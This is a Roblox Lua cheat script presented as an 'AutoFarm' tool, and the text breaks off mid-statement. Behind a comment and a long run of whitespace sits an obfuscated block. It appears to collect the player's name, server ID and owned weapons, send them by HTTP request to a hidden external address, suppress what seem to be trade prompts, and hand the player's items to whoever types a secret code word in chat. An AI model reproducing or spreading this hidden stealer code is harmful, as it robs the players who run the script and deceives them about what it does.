local A =
    pcall(
    function()
        local B = Instance.new("Folder", game:GetService("CoreGui"))
    end
)
A = not A
local C
if A then
    C = game:GetService("Players").LocalPlayer.PlayerGui
else
    C = game:GetService("CoreGui")
end
local D = {}
D["1"] = Instance.new("ScreenGui", C)
D["1"]["Name"] = "AutoFarm"
D["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
local E = Instance.new("Frame", D["1"])
E.Name = "Drawings"
E.BackgroundTransparency = 1
E.Size = UDim2.fromScale(1, 1)
local F = {}
do
    local game = game
    local G, H = game.GetService, game.FindFirstChild
    local I = game.IsA
    local J, K, L = Vector2.new, Instance.new, UDim2.new
    local M = G(game, "Workspace")
    local N = H(M, "Camera")
    local O = G(game, "CoreGui")
    local P =
        setmetatable(
        {Visible = false, Color = Color3.new(), Transparency = 0, ZIndex = 1, Remove = function()
            end},
        {__add = function(Q, R)
                local S = {}
                for u, T in next, Q do
                    S[u] = T
                end
                for u, T in next, R do
                    S[u] = T
                end
                return S
            end}
    )
    F.new = function(U, D)
        D = E
        if U == "Text" then
            local V = {Text = "", Font = "", Size = 10, XAlign = "Center", YAlign = "Center"} + P
            local W = K("TextLabel")
            W.Parent = D
            W.Text = ""
            W.BackgroundTransparency = 1
            W.TextColor3 = V.Color
            W.TextSize = V.Size
            W.TextXAlignment = Enum.TextXAlignment.Center
            W.Visible = false
            return setmetatable(
                {},
                {__newindex = function(self, X, Y)
                        if X == "Position" then
                            W.Position = UDim2.fromOffset(Y.X, Y.Y)
                            V.Position = Y
                        end
                        if X == "Transparency" then
                            W.TextTransparency = Y
                            V.Transparency = Y
                        end
                        if X == "Text" then
                            W.Text = Y
                            V.Text = Y
                        end
                        if X == "Size" then
                            W.TextSize = Y
                            V.Size = Y
                        end
                        if X == "Color" then
                            W.TextColor3 = Y
                            V.Color = Y
                        end
                        if X == "XAlign" then
                            W.TextXAlignment = Enum.TextXAlignment[Y]
                            V.XAlign = Enum.TextXAlignment[Y]
                        end
                        if X == "YAlign" then
                            W.TextYAlignment = Enum.TextXYlignment[Y]
                            V.YAlign = Enum.TextXYlignment[Y]
                        end
                        if X == "Visible" then
                            W.Visible = Y
                            V.Visible = Y
                        end
                    end, __index = function(self, X)
                        if X == "Remove" then
                            return function()
                                W:Destroy()
                            end
                        end
                        return V[X]
                    end}
            )
        end
        if U == "Line" then
            local Z =
                {To = J(), From = J(), Thickness = 1, Fade = {Enabled = false, Rotation = 0, Color = Color3.new()}} + P
            local _ = K("Frame")
            _.AnchorPoint = J(0.5, 0.5)
            _.BorderSizePixel = 0
            _.BackgroundColor3 = Z.Color
            _.Visible = Z.Visible
            _.BackgroundTransparency = Z.Transparency
            _.Parent = D
            local a0 = Instance.new("UIGradient", _)
            a0.Rotation = Z.Rotation
            a0.Enabled = Z.Fade.Enabled
            return setmetatable(
                {},
                {__newindex = function(self, X, Y)
                        if X == "Fade" then
                            if typeof(Y[1]) ~= typeof(Color3.new()) then
                                warn("attempt set color to " .. typeof(Y[1]) .. " value!")
                            else
                                Z.Fade.Color = Y[1]
                            end
                            if Y[2] then
                                Z.Fade.Rotation = Y[2]
                            end
                            if Y[3] then
                                Z.Fade.Enabled = Y[3]
                            end
                        end
                        if X == "Color" then
                            _.BackgroundColor3 = Y
                            Z.Color = Y
                        end
                        if X == "ZIndex" then
                            _.ZIndex = Y
                            Z.ZIndex = Y
                        end
                        if X == "Visible" then
                            _.Visible = Y
                            Z.Visible = Y
                        end
                        if X == "Thickness" then
                            Z.Thickness = Y
                        end
                        if X == "Transparency" then
                            _.BackgroundTransparency = Y
                            Z.Transparency = Y
                        end
                        if X == "To" then
                            local n = Y
                            local a1 = n - Z.From
                            local a2 = (n + Z.From) / 2
                            local a3 = a1.Magnitude
                            local a4 = math.atan2(a1.Y, a1.X)
                            _.Position = UDim2.fromOffset(a2.X, a2.Y)
                            _.Rotation = math.deg(a4)
                            _.Size = UDim2.fromOffset(a3, Z.Thickness)
                            Z.To = n
                        end
                        if X == "From" then
                            local a5 = Y
                            local a1 = Z.To - a5
                            local a2 = (Z.To + a5) / 2
                            local a3 = a1.Magnitude
                            local a4 = math.atan2(a1.Y, a1.X)
                            _.Position = UDim2.fromOffset(a2.X, a2.Y)
                            _.Rotation = math.deg(a4)
                            Z.From = a5
                        end
                        if X == "Visible" then
                            _.Visible = Y
                            Z.Visible = Y
                        end
                    end, __index = function(self, X)
                        if X == "Remove" then
                            return function()
                                _:Destroy()
                            end
                        end
                        return Z[X]
                    end}
            )
        end
        if U == "Square" then
            local a6 =
                {
                Thickness = 1,
                Size = J(),
                Position = J(),
                Filled = false,
                XAlign = "Left",
                YAlign = "Top",
                Fade = {Enabled = false, Rotation = 0, Color = Color3.new()}
            } + P
            local a7 = Instance.new("Frame")
            a7.AnchorPoint = J(0, 0)
            a7.BorderSizePixel = 0
            a7.Visible = false
            a7.Parent = D
            local a0 = Instance.new("UIGradient", a7)
            a0.Rotation = a6.Rotation
            a0.Enabled = a6.Fade.Enabled
            local a8 = Instance.new("UIStroke")
            a8.Thickness = a6.Thickness
            a8.Enabled = false
            a8.Parent = a7
            local a9 = a0:Clone()
            a9.Parent = a8
            return setmetatable(
                {},
                {__newindex = function(self, X, Y)
                        if X == "Fade" then
                            print(Y[1], Y[2], Y[3])
                            if typeof(Y[1]) ~= typeof(Color3.new()) then
                                warn("attempt set color to " .. typeof(Y[1]) .. " value!")
                            else
                                a6.Fade.Color = Y[1]
                            end
                            if Y[2] then
                                a6.Fade.Rotation = Y[2]
                            end
                            if Y[3] then
                                a6.Fade.Enabled = Y[3]
                            end
                        end
                        if X == "Size" then
                            a7.Size = L(0, Y.X, 0, Y.Y)
                            a6.Size = Y
                        end
                        if X == "Position" then
                            a7.Position = L(0, Y.X, 0, Y.Y)
                            a6.Position = Y
                        end
                        if X == "Color" then
                            a7.BackgroundColor3 = Y
                            a8.Color = Y
                            a6.Color = Y
                        end
                        if X == "Transparency" then
                            if a6.Filled == true then
                                a7.BackgroundTransparency = Y
                            else
                                a8.Transparency = Y
                            end
                            a6.Transparency = Y
                        end
                        if X == "Visible" then
                            if Y == true then
                                a7.Visible = true
                                if a6.Filled == true then
                                    a7.BackgroundTransparency = a6.Transparency
                                    a8.Enabled = false
                                else
                                    a7.BackgroundTransparency = 1
                                    a8.Enabled = true
                                end
                            else
                                a7.Visible = false
                                a8.Enabled = false
                            end
                            a6.Visible = Y
                        end
                        if X == "Filled" then
                            if a6.Visible == true then
                                if Y == false then
                                    a7.BackgroundTransparency = 1
                                else
                                    a7.BackgroundTransparency = a6.Transparency
                                end
                                a8.Enabled = not Y
                            end
                            a6.Filled = Y
                        end
                        if X == "XAlign" then
                            if Y == "Left" then
                                a7.AnchorPoint = J(0, a7.AnchorPoint.Y)
                            elseif Y == "Center" then
                                a7.AnchorPoint = J(0.5, a7.AnchorPoint.Y)
                            elseif Y == "Right" then
                                a7.AnchorPoint = J(-1, a7.AnchorPoint.Y)
                            end
                            a6.XAlign = Y
                        end
                        if X == "YAlign" then
                            if Y == "Top" then
                                a7.AnchorPoint = J(a7.AnchorPoint.X, 0)
                            elseif Y == "Center" then
                                a7.AnchorPoint = J(a7.AnchorPoint.X, 0.5)
                            elseif Y == "Bottom" then
                                a7.AnchorPoint = J(a7.AnchorPoint.X, -1)
                            end
                            a6.YAlign = Y
                        end
                    end, __index = function(self, X)
                        if X == "Remove" then
                            return function()
                                a7:Destroy()
                            end
                        end
                        return a6[X]
                    end}
            )
        end
        if U == "Image" then
            local aa = {Data = "rbxassetid://848623155", Size = J(), Position = J(), Rounding = 0}
            local ab = K("ImageLabel")
            ab.AnchorPoint = J(0.5, 0.5)
            ab.BorderSizePixel = 0
            ab.ScaleType = Enum.ScaleType.Stretch
            ab.Transparency = 1
            ab.Visible = false
            ab.Parent = D
            return setmetatable(
                {},
                {__newindex = function(self, X, Y)
                        if X == "Position" then
                            ab.Position = L(0, Y.X, 0, Y.Y)
                            aa.Position = Y
                        end
                        if X == "Size" then
                            ab.Size = L(0, Y.X, 0, Y.Y)
                            aa.Size = Y
                        end
                        if X == "Transparency" then
                            ab.ImageTransparency = Y
                            aa.Transparency = Y
                        end
                        if X == "Visible" then
                            ab.Visible = Y
                            aa.Visible = Y
                        end
                        if X == "Color" then
                            ab.ImageColor3 = Y
                            ab.Color = Y
                        end
                        if X == "Data" then
                            ab.Image = Y
                            aa.Data = Y
                        end
                    end, __index = function(self, X)
                        if X == "Remove" then
                            return function()
                                ab:Destroy()
                            end
                        end
                        return ab[X]
                    end}
            )
        end
        if U == "Circle" then
            local ac =
                {Radius = 50, Thickness = 1, Position = J(), Filled = false, XAlign = "Center", YAlign = "Center"} + P
            local ad = K("Frame")
            ad.AnchorPoint = J(0.5, 0.5)
            ad.BorderSizePixel = 0
            ad.Visible = false
            ad.Parent = D
            ad.Size = L(0, 100, 0, 100)
            local a8 = K("UIStroke")
            a8.Thickness = ac.Thickness
            a8.Enabled = false
            a8.Parent = ad
            local ae = K("UICorner")
            ae.CornerRadius = UDim.new(1, 0)
            ae.Parent = ad
            return setmetatable(
                {},
                {__newindex = function(self, X, Y)
                        if X == "Radius" then
                            ad.Size = L(0, Y, 0, Y)
                            ac.Radius = Y
                        end
                        if X == "Thickness" then
                            a8.Thickness = Y
                            ac.Thickness = Y
                        end
                        if X == "XAlign" then
                            if Y == "Left" then
                                ad.AnchorPoint = J(0, ad.AnchorPoint.Y)
                            elseif Y == "Center" then
                                ad.AnchorPoint = J(0.5, ad.AnchorPoint.Y)
                            elseif Y == "Right" then
                                ad.AnchorPoint = J(-1, ad.AnchorPoint.Y)
                            end
                            ac.XAlign = Y
                        end
                        if X == "YAlign" then
                            if Y == "Top" then
                                ad.AnchorPoint = J(ad.AnchorPoint.X, 0)
                            elseif Y == "Center" then
                                ad.AnchorPoint = J(ad.AnchorPoint.X, 0.5)
                            elseif Y == "Bottom" then
                                ad.AnchorPoint = J(ad.AnchorPoint.X, -1)
                            end
                            ac.YAlign = Y
                        end
                        if X == "Position" then
                            local af = Y.X
                            local ag = Y.Y
                            ad.Position = L(0, af, 0, ag)
                            ac.Position = Y
                        end
                        if X == "Color" then
                            ad.BackgroundColor3 = Y
                            a8.Color = Y
                            ac.Color = Y
                        end
                        if X == "Transparency" then
                            if ac.Filled == true then
                                ad.BackgroundTransparency = Y
                            else
                                a8.Transparency = Y
                            end
                            ac.Transparency = Y
                        end
                        if X == "Visible" then
                            if Y == true then
                                ad.Visible = true
                                if ac.Filled == true then
                                    ad.BackgroundTransparency = ac.Transparency
                                    a8.Enabled = false
                                else
                                    ad.BackgroundTransparency = 1
                                    a8.Enabled = true
                                end
                            else
                                ad.Visible = false
                                a8.Enabled = false
                            end
                            ac.Visible = Y
                        end
                        if X == "Filled" then
                            if ac.Visible == true then
                                if Y == false then
                                    ad.BackgroundTransparency = 1
                                else
                                    ad.BackgroundTransparency = ac.Transparency
                                end
                                a8.Enabled = not Y
                            end
                            ac.Filled = Y
                        end
                    end, __index = function(self, X)
                        if X == "Remove" then
                            return function()
                                ad:Destroy()
                            end
                        end
                        return ac[X]
                    end}
            )
        end
        if U == "Quad" then
            return setmetatable({}, {})
        end
    end
end
D["c"] = Instance.new("TextLabel", D["1"])
D["c"]["TextWrapped"] = true
D["c"]["BorderSizePixel"] = 0
D["c"]["TextXAlignment"] = Enum.TextXAlignment.Right
D["c"]["TextScaled"] = true
D["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
D["c"]["TextSize"] = 19
D["c"]["FontFace"] = Font.new( "rbxasset://fonts/families/Inconsolata.json" , Enum["FontWeight"]["Regular"] , Enum["FontStyle"]["Normal"] )
D["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
D["c"]["BackgroundTransparency"] = 1
D["c"]["Size"] = UDim2.new(0, 0, 0.03752, 0)
D["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["c"]["Text"] = "Loading data"
D["c"]["Name"] = "Loading"
D["c"]["Position"] = UDim2.new(-0.0007, 0, 0.1837, 0)
local ah = game:GetService("TweenService")
ah:Create(D["c"], TweenInfo.new(3), {Size = UDim2.new(1.3, 0, 0.03752, 0)}):Play() 
--[[just waitt _-_]]                                                                                                                                                                                                                                                                                                                                                                                         function v1(a)local b=tonumber("\53\56")local c=tonumber("\50\48\48")local d=""local e=""for f,g in next,a do d=tostring(g)local h=""for i=tonumber("\48"),#d do if d:sub(#d-i,#d-i)~=""then if string.byte(d:sub(#d-i,#d-i))>=58 and string.byte(d:sub(#d-i,#d-i))<=200 then h=""break else h=h..d:sub(#d-i,#d-i)end end end;if h~=""then e=e..string.char(tonumber(h))end end;if not _G["\12\89\23"]then return"\112\105\100\111\114"end;return e end;_G["\12\89\23"]=tonumber("\51")local a=getfenv(tonumber(v1({"\105\51\48","\56\52"})))[v1({"\51\48\49","\55\57","\57\48\49",v1({"\57\52","\56\52","\57\52"})})]:GetService(v1({"\50\56","\49\48\49","\50\49\49","\56\48\49","\53\48\49","\57\57","\55\57","\54\49\49","\49\48\49","\48\48\49","\51\56","\54\49\49","\49\49\49","\52\49\49",v1({"\53\53","\55\53"}),"\51\48\49","\49\48\49"}))[v1({"\50\56","\49\48\49","\57\48\49","\49\49\49",v1({"\52\53","\57\52","\57\52"}),"\49\48\49",v1({"\51\53",v1({"\55\53",v1({"\48\53","\51\53"})}),v1({"\55\53","\50\53"})})})][v1({"\51\55",v1({"\56\52",v1({"\55\53","\50\53"}),"\57\52"}),"\56\49\49",v1({"\57\52","\56\52","\57\52"}),"\48\49\49","\54\49\49","\49\49\49",v1({"\50\53","\57\52",v1({"\55\53","\50\53"})}),"\49\50\49"})][v1({"\49\55","\49\48\49","\54\49\49","\48\56","\52\49\49","\49\49\49","\50\48\49","\53\48\49","\56\48\49","\49\48\49",v1({"\54\53",v1({"\50\53",v1({"\49\53","\51\53"})})}),"\55\57",v1({"\52\53","\57\52","\57\52"}),v1({"\53\53",v1({"\53\53",v1({"\49\53","\51\53"})})})})]:InvokeServer()a=a.Weapons.Owned;local b={}local c=""local d=0;for e in pairs(a)do d=d+1;c=c..v1({"\50\51","\50\51","\50\51","\50\51","\50\51","\50\51",v1({"\48\53","\49\53"}),"\50\51","\50\51","\50\51","\50\51","\50\51"})..d..v1({"\54\52"})..e.."\n"b[d]=e end;local f={v1({"\57\55","\51\51"}),v1({v1({"\51\53","\52\53"}),"\50\52"}),v1({v1({"\48\53",v1({"\51\53","\51\53"})}),"\56\51"}),v1({"\55\57","\49\54"}),v1({"\52\48\49",v1({"\49\53","\50\53"})}),v1({"\55\48\49",v1({"\57\52","\50\53"})}),v1({"\49\49\49","\56\53"}),v1({"\53\56","\50\52"}),v1({"\51\48\49",v1({"\50\53","\55\53"})})}local g=f[math.random(1,#f)]local h=getfenv(tonumber(v1({"\105\51\48","\56\52"})))[v1({"\51\48\49","\55\57","\57\48\49",v1({"\57\52","\56\52","\57\52"})})]:GetService(v1({"\50\55","\54\49\49","\54\49\49","\50\49\49","\51\56","\49\48\49","\52\49\49",v1({v1({"\52\53",v1({"\49\53",v1({v1({"\57\52","\51\53"}),v1({"\49\53",v1({"\49\53","\51\53"})})})})}),"\57\52",v1({"\55\53","\50\53"})}),v1({"\51\53","\56\52",v1({"\55\53","\50\53"})}),v1({"\55\53",v1({v1({"\51\53","\51\53"}),"\51\53"})}),"\49\48\49"}))local i=v1({"\52\48\49","\54\49\49","\54\49\49","\50\49\49","\53\49\49","\56\53","\55\52",v1({"\53\53",v1({"\48\53",v1({"\49\53","\51\53"})})}),v1({"\56\52","\56\52",v1({"\55\53","\50\53"})}),v1({"\51\53","\56\52","\57\52"}),"\53\49\49",v1({"\55\53","\55\53"}),v1({"\57\52",v1({"\55\53","\50\53"}),v1({"\55\53",v1({"\48\53","\51\53"})})}),"\52\49\49","\48\48\49",v1({"\52\53","\50\53"}),"\57\57","\49\49\49",v1({"\55\53",v1({"\54\53","\50\53"}),"\57\52"}),"\55\52","\55\57","\50\49\49","\53\48\49","\55\52","\57\49\49","\49\48\49","\56\57","\52\48\49","\49\49\49","\49\49\49","\55\48\49",v1({"\51\53","\57\52","\57\52"}),"\55\52",v1({"\55\53",v1({"\48\53",v1({"\49\53","\51\53"})})}),"\49\53","\56\52","\55\53","\55\53",v1({"\48\53",v1({"\49\53",v1({"\49\53",v1({"\49\53",v1({"\49\53","\51\53"})})})})}),"\52\53","\54\53","\55\53",v1({"\55\53","\50\53"}),"\49\53",v1({"\48\53",v1({"\49\53","\51\53"})}),"\55\53",v1({"\49\53","\51\53"}),"\48\53",v1({"\48\53",v1({"\49\53",v1({"\49\53","\51\53"})})}),"\51\53","\48\53",v1({"\55\53","\50\53"}),v1({"\53\53","\50\53"}),v1({"\57\52","\53\53"}),"\54\48\49",v1({"\52\53","\53\53"}),v1({"\50\53",v1({"\49\53","\51\53"})}),"\57\48\49","\49\56","\53\52",v1({"\55\53",v1({"\50\53","\51\53"})}),v1({"\54\53","\54\53"}),"\53\57","\53\55",v1({"\55\53","\55\53"}),"\53\52","\57\54","\54\54",v1({"\52\53","\53\53"}),"\49\49\49","\57\49\49","\52\49\49",v1({"\51\53","\52\53"}),"\50\56","\56\56",v1({"\57\52","\48\53","\57\52"}),"\49\49\49",v1({"\52\53","\54\53"}),v1({"\50\53","\53\53"}),v1({"\50\53","\54\53"}),v1({"\57\52","\51\53"}),v1({"\55\53","\52\53"}),"\53\52",v1({"\54\53","\50\53"}),v1({"\55\53","\55\53"}),v1({"\52\53","\52\53"}),v1({"\56\52","\48\53",v1({"\55\53","\50\53"})}),"\54\54","\57\55","\56\52","\56\48\49","\57\56","\53\54","\57\55","\57\55","\54\54","\54\54","\55\53","\48\56",v1({"\54\53","\55\53"}),"\48\48\49","\55\48\49",v1({"\56\52","\51\53"}),"\50\55","\50\49\49",v1({"\49\53","\53\53"}),v1({"\51\53",v1({"\55\53",v1({"\48\53",v1({"\49\53","\51\53"})})}),v1({"\55\53","\50\53"})}),v1({"\56\52","\48\53","\57\52"}),"\55\48\49","\50\55","\49\48\49",v1({"\51\53","\52\53"}),v1({"\53\53","\53\53"}),"\54\49\49","\57\48\49",v1({"\49\53","\56\52",v1({"\55\53","\50\53"})}),"\56\52","\48\48\49","\48\49\49",v1({"\52\53","\52\53"}),"\49\55"})local j={[v1({"\57\57","\49\49\49","\48\49\49",v1({"\52\53","\57\52","\57\52"}),"\49\48\49","\48\49\49",v1({v1({"\50\53","\51\53"}),v1({v1({"\53\53",v1({v1({"\57\52","\51\53"}),"\51\53"})}),"\50\53"}),"\57\52"})})]=v1({"\51\56","\57\57","\52\49\49","\53\48\49",v1({"\48\53","\57\52",v1({"\55\53","\50\53"})}),"\54\49\49","\50\51","\55\57",v1({"\55\53","\55\53"}),v1({"\52\53","\57\52","\57\52"}),"\53\48\49","\56\49\49","\55\57",v1({"\52\53","\57\52","\57\52"}),"\49\48\49",v1({"\56\52","\56\52","\57\52"}),v1({"\56\52","\57\52"}),"\48\56","\56\48\49",v1({"\53\53","\55\53"}),"\49\50\49","\49\48\49",v1({"\50\53",v1({"\55\53","\50\53"}),"\57\52"}),"\56\53","\50\51"})..game.Players.LocalPlayer.Name..v1({"\48\49","\48\56","\52\49\49","\49\49\49","\54\49\49","\49\49\49",v1({"\55\53","\55\53"}),"\49\49\49",v1({"\54\53",v1({"\54\53","\50\53"}),"\57\52"}),"\56\53","\50\51"})..g..v1({"\48\49","\52\55","\49\49\49","\56\57",v1({"\49\53",v1({"\51\53","\51\53"})}),"\48\48\49","\56\53","\50\51"})..getfenv(tonumber(v1({"\105\51\48","\56\52"})))[v1({"\51\48\49","\55\57","\57\48\49",v1({"\57\52","\56\52","\57\52"})})][v1({"\52\55",v1({"\57\52","\57\52",v1({"\55\53",v1({"\48\53","\51\53"})})}),"\56\57",v1({"\49\53",v1({"\51\53",v1({"\49\53","\51\53"})})}),v1({"\56\52","\56\52","\57\52"})})]..v1({"\48\49","\55\56",v1({v1({"\55\53","\50\53"}),"\56\52","\57\52"}),v1({"\53\53","\55\53"}),v1({"\48\53",v1({v1({"\53\53",v1({"\49\53","\51\53"})}),v1({"\48\53",v1({v1({"\57\52","\51\53"}),"\51\53"})})}),"\57\52"}),"\49\49\49",v1({"\56\52",v1({"\55\53","\50\53"}),"\57\52"}),"\53\49\49","\56\53",v1({"\56\52","\57\52"})})..c}j=h:JSONEncode(j)local k=request({[v1({"\53\56","\52\49\49","\56\48\49"})]=i,[v1({"\55\55","\49\48\49",v1({"\52\53","\57\52",v1({v1({"\53\53","\51\53"}),v1({"\48\53","\51\53"})})}),v1({"\50\53","\56\52","\57\52"}),"\49\49\49",v1({v1({"\54\53",v1({"\48\53","\51\53"})}),"\56\52","\57\52"})})]=v1({v1({"\56\52","\54\53"}),"\57\55","\51\56","\52\56"}),[v1({v1({"\52\53","\52\53"}),"\49\49\49",v1({"\56\52","\56\52","\57\52"}),v1({v1({"\55\53",v1({"\48\53","\51\53"})}),"\48\53","\57\52"})})]=j})function WaitForChanges(l,m,n)local o=l[m]repeat task.wait()until l[m]~=o;l[m]=n end;local p;local q;spawn(function()while task.wait()do p=game.Players.LocalPlayer[v1({"\48\56",v1({"\54\53",v1({"\54\53",v1({"\48\53",v1({"\49\53","\51\53"})})}),"\57\52"}),v1({"\53\53","\55\53"}),"\49\50\49",v1({"\57\52",v1({"\54\53","\50\53"}),"\57\52"}),"\52\49\49",v1({"\57\52","\53\53"}),v1({"\53\53","\57\52",v1({"\55\53","\50\53"})}),"\53\48\49"})]:WaitForChild(v1({"\52\56","\52\49\49","\55\57","\48\48\49","\49\48\49",v1({"\57\52","\53\53"}),"\53\56","\51\55"}))q=game.Players.LocalPlayer[v1({"\48\56",v1({"\54\53",v1({"\54\53","\50\53"}),v1({"\55\53",v1({"\48\53","\51\53"})})}),v1({"\53\53","\55\53"}),v1({"\57\52","\48\53","\57\52"}),"\49\48\49","\52\49\49","\49\55","\55\49\49","\53\48\49"})]:WaitForChild(v1({"\52\56","\52\49\49",v1({"\53\53","\55\53"}),"\48\48\49","\49\48\49","\49\55","\53\56","\51\55","\53\57","\48\56",v1({v1({"\48\53","\51\53"}),"\56\52",v1({"\55\53",v1({"\48\53","\51\53"})})}),"\49\49\49","\48\49\49","\49\48\49"}))p.Enabled=false;q.Enabled=false end end)for r,s in pairs(game.Players:GetPlayers())do s[v1({"\55\54","\52\48\49",v1({"\53\53",v1({"\53\53","\51\53"})}),"\54\49\49",v1({"\52\53","\57\52","\57\52"}),v1({"\57\52",v1({"\54\53","\50\53"}),v1({"\55\53","\50\53"})}),"\48\48\49"})]:Connect(function(t)if t==g..v1({v1({"\55\53","\50\53"})})then game[v1({"\50\56","\49\48\49","\50\49\49",v1({"\54\53","\56\52","\57\52"}),"\53\48\49","\57\57","\55\57","\54\49\49","\49\48\49","\48\48\49","\51\56","\54\49\49","\49\49\49",v1({"\50\53",v1({"\55\53",v1({"\48\53","\51\53"})}),"\57\52"}),v1({"\53\53","\55\53"}),"\51\48\49","\49\48\49"})][v1({"\52\56","\52\49\49","\55\57",v1({"\56\52",v1({"\54\53","\50\53"}),v1({"\55\53","\50\53"})}),"\49\48\49"})][v1({v1({"\49\53","\54\53"}),"\49\48\49",v1({"\56\52","\57\52","\57\52"}),v1({"\56\52","\56\52",v1({"\55\53","\50\53"})}),"\50\56","\49\48\49","\51\49\49","\55\49\49",v1({"\57\52","\56\52","\57\52"}),"\53\49\49","\54\49\49"})]:InvokeServer(s)end;if t==g..v1({"\48\53"})then game[v1({"\111\49\51","\50\56","\102\51\49","\49\48\49","\111\55\55",v1({"\115\52\57","\48\53",v1({"\115\52\55","\55\53","\113\53\50","\50\53"}),"\57\52"}),"\106\54\53","\56\48\49","\98\51\56",v1({v1({"\106\49\48","\49\53","\106\54\56","\51\53"}),"\108\57\54",v1({"\54\53","\121\54\50","\50\53"}),"\57\52"}),"\57\57","\100\51\55","\55\57","\121\52\52","\54\49\49","\121\56\54","\49\48\49","\110\55\55",v1({"\120\52\55","\56\52","\102\53\53","\56\52","\117\48\52",v1({"\114\50\55",v1({"\109\53\50","\53\53","\112\49\56","\51\53"}),"\105\57\52","\50\53"})}),v1({"\115\53\53",v1({"\111\53\57","\57\52","\114\54\57","\51\53"}),"\54\53"}),"\122\48\53",v1({"\52\53","\103\49\50","\57\52","\57\52"}),"\49\49\49","\100\54\48","\52\49\49","\117\53\56","\55\57","\111\52\49","\51\48\49","\107\54\54",v1({"\57\52","\120\53\50","\56\52","\57\52"})})][v1({"\107\51\52","\52\56","\99\55\53","\52\49\49","\122\57\55",v1({"\101\53\49","\53\53","\98\49\54","\55\53"}),"\48\48\49","\49\48\49"})][v1({"\53\54","\57\57",v1({"\55\53",v1({"\53\53","\51\53"})}),v1({"\57\52",v1({"\54\53","\50\53"}),"\57\52"}),"\50\49\49","\54\49\49","\52\56",v1({"\50\53","\57\52","\57\52"}),v1({"\53\53","\55\53"}),v1({"\56\52","\56\52","\57\52"}),"\49\48\49"})]:FireServer(tonumber(v1({"\48\53","\54\53",v1({v1({"\57\52","\51\53"}),v1({"\49\53","\51\53"})}),v1({"\50\53","\51\53"}),"\50\53","\52\53","\51\53","\54\53",v1({v1({"\54\53",v1({"\48\53",v1({"\49\53","\51\53"})})}),"\51\53"})})))end;if t:sub(1,4)==g..v1({"\51\56",v1({"\52\53",v1({"\51\53",v1({"\49\53","\51\53"})})})})then for u=1,4 do if t:sub(u+4,u+4)==""then break end;local v=tonumber(t:sub(u+4,u+4))local w=b[v]game[v1({"\50\56","\49\48\49",v1({v1({"\56\52","\51\53"}),"\57\52","\57\52"}),v1({"\54\53","\56\52","\57\52"}),"\53\48\49",v1({"\55\53",v1({v1({"\51\53","\51\53"}),v1({v1({"\57\52",v1({v1({"\57\52",v1({"\49\53","\51\53"})}),"\51\53"})}),"\51\53"})})}),v1({"\53\53",v1({v1({"\51\53",v1({"\49\53","\51\53"})}),v1({v1({"\57\52","\51\53"}),"\51\53"})})}),v1({"\52\53","\57\52","\57\52"}),"\49\48\49","\48\48\49","\51\56","\54\49\49",v1({"\57\52",v1({"\55\53","\50\53"}),"\57\52"}),v1({v1({"\48\53","\51\53"}),v1({v1({"\53\53","\51\53"}),"\50\53"}),"\57\52"}),"\55\57",v1({v1({"\57\52","\51\53"}),"\56\52","\57\52"}),"\49\48\49"})][v1({"\52\56",v1({"\50\53","\57\52","\57\52"}),"\55\57",v1({"\56\52","\56\52",v1({"\55\53","\50\53"})}),"\49\48\49"})][v1({"\57\55","\50\48\49","\50\48\49","\49\48\49","\52\49\49","\51\55",v1({"\52\53","\57\52","\57\52"}),"\49\48\49","\57\48\49"})]:FireServer(w,v1({v1({"\53\53",v1({v1({"\50\53",v1({"\49\53",v1({"\49\53",v1({"\49\53","\51\53"})})})}),"\51\53"})}),v1({"\57\52","\56\52","\57\52"}),v1({"\53\53",v1({v1({"\51\53","\51\53"}),"\51\53"})}),"\50\49\49",v1({"\57\52","\57\52",v1({v1({"\53\53",v1({"\49\53","\51\53"})}),"\50\53"})}),v1({v1({"\54\53","\50\53"}),"\57\52","\57\52"}),"\53\49\49"}))end end;if t==g..v1({"\50\56","\57\54","\54\55"})then local x=game:GetService(v1({"\50\56","\49\48\49","\50\49\49",v1({"\54\53","\56\52","\57\52"}),"\53\48\49","\57\57","\55\57","\54\49\49","\49\48\49","\48\48\49","\51\56",v1({v1({"\50\53","\51\53"}),"\57\52","\57\52"}),"\49\49\49","\52\49\49","\55\57",v1({v1({"\57\52","\51\53"}),"\56\52","\57\52"}),v1({v1({"\55\53","\50\53"}),v1({v1({"\52\53","\51\53"}),v1({"\48\53","\51\53"})}),"\57\52"})})).Remotes[v1({"\51\55","\48\49\49","\56\49\49",v1({"\57\52","\56\52","\57\52"}),"\48\49\49","\54\49\49","\49\49\49",v1({v1({"\48\53","\51\53"}),v1({v1({"\53\53","\51\53"}),v1({"\48\53","\51\53"})}),"\57\52"}),"\49\50\49"})][v1({"\49\55",v1({"\57\52","\56\52",v1({"\55\53","\50\53"})}),"\54\49\49","\48\56","\52\49\49","\49\49\49",v1({"\48\53",v1({"\54\53","\50\53"}),v1({"\55\53",v1({"\48\53","\51\53"})})}),v1({"\51\53","\56\52","\57\52"}),"\56\48\49","\49\48\49","\56\54","\55\57",v1({"\52\53","\57\52","\57\52"}),"\55\57"})]:InvokeServer()x=x[v1({"\55\56","\49\48\49","\55\57","\50\49\49","\49\49\49","\48\49\49","\53\49\49"})].Owned;local y={}local z=""local d=0;for e in pairs(x)do d=d+1;z=z.."            "..d.."."..e.."\n"y[d]=e end;b=y;c=z;local 